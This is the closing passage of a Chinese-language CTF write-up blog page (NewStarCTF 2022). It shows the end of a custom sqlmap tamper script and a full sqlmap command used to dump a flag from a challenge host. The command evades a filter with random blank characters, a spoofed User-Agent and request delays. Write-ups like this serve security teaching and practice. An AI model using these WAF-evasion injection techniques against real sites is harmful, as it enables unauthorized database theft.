random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="string">&quot;text&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>该脚本将 payload 中非引号括起即字符串的部分的空格全部随机替换为指定空白字符，同时将 payload 中的 <code>*</code> 替换为具体的字段名”text”。</p>
<p>原因是 sqlmap 在探测出目标表的各字段名后，在恢复记录内容之前要先获取记录数量，在查询数量时它使用 <code>*</code> 而非（已经获得的）具体字段名，例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> wfy.wfy_comments</span><br></pre></td></tr></table></figure></div>

<p>由于题目过滤了该字符，会返回 500 的响应，这将导致 sqlmap 会卡在恢复记录数量这一步。</p>
<p>最终有效的 sqlmap payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://87490559-a696-4b64-91bf-4731ae7cbddc.node4.buuoj.cn:81/comments.php --method=POST --data <span class="string">&quot;name=1&quot;</span> -p name --technique T --batch --tamper=diy/space2blank.py -H <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span> --delay=0.1 -D wfy -T wfy_comments -C text --dump</span><br></pre></td></tr></table></figure></div>

<p><strong>参数讲解：</strong></p>
<ol>
<li><p><code>--tamper=</code> 选择自己的脚本位置，我将脚本放在了”diy”文件夹下。（注意要在文件夹下添加 <code>__init__.py</code> 文件，直接 cp 原 tamper 文件夹中的就行）</p>
</li>
<li><p><code>-H &quot;User-Agent: ...&quot;</code> 替换 UA 头，Sqlmap 有自己的默认 UA 头，具有标识度，本体会根据该 UA 头 ban 掉 sqlmap 的流量，响应内容如下：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP response [#1] (200 OK):^M</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty^M</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 06 Oct 2023 18:33:17 GMT^M</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8^M</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked^M</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close^M</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip^M</span><br><span class="line"><span class="attribute">URI</span><span class="punctuation">: </span>http://160ab2ca-3be9-481d-872f-ce6ba6433864.node4.buuoj.cn:81/comments.php^M</span><br><span class="line">^M</span><br><span class="line">&lt;h1&gt;不许用sqlmap！！！！！&lt;/h1&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>--delay=0.1</code> 为扫描添加 0.1s 的延迟，避免访问过频繁直接被 ban。</p>
</li>
</ol>
<p>最后恢复出 flag：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retrieved: flag&#123;Ju2t_let_me_s1eep_f0r_a_whi1e&#125;</span><br></pre></td></tr></table></figure></div>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> NewStarCTF 2022</li>
        <li><strong>Author:</strong> Forestsetyou</li>
        <li><strong>Created at
                :</strong> 2022-10-18 17:04:00</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2023-11-01 00:49:00
            </li>
        
        <li>
            <strong>Link:</strong> https://forestsetyou.github.io/2022/10/18/Security/CTF/NewStarCTF 2022/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2023/02/21/Development/Project/ComicCrawling/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">ComicCrawling</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2022/05/08/Security/CTF/2022-r00t-%E6%96%B0%E7%94%9F%E8%B5%9B/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">2022-r00t-新生赛</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">NewStarCTF 2022</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Week1"><span class="nav-text">WEB-Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E7%9C%9F%E7%9A%84%E4%BC%9A%E8%B0%A2"><span class="nav-text">我真的会谢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NotPHP"><span class="nav-text">NotPHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Word-For-You"><span class="nav-text">Word-For-You</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Week2"><span class="nav-text">WEB-Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Word-For-You-1"><span class="nav-text">Word-For-You</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Include-One"><span class="nav-text">Include One</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnserializeOne"><span class="nav-text">UnserializeOne</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezAPI"><span class="nav-text">ezAPI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Week3"><span class="nav-text">WEB-Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BabySSTI-One"><span class="nav-text">BabySSTI_One</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IncludeTwo"><span class="nav-text">IncludeTwo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Maybe-You-Have-To-think-More"><span class="nav-text">Maybe You Have To think More</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Week4"><span class="nav-text">WEB-Week4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#So-Baby-RCE"><span class="nav-text">So Baby RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabySSTI-Two"><span class="nav-text">BabySSTI_Two</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%88%E4%B8%80%E4%B8%AASQL"><span class="nav-text">又一个SQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnserializeThree"><span class="nav-text">UnserializeThree</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rome"><span class="nav-text">Rome</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-Week5"><span class="nav-text">WEB-Week5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Give-me-your-photo-PLZ"><span class="nav-text">Give me your photo PLZ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unsafe-Apache"><span class="nav-text">Unsafe Apache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#So-Baby-RCE-Again"><span class="nav-text">So Baby RCE Again</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabySSTI-Three"><span class="nav-text">BabySSTI_Three</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Final-Round"><span class="nav-text">Final Round</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
        </div>
        
        
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>






  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
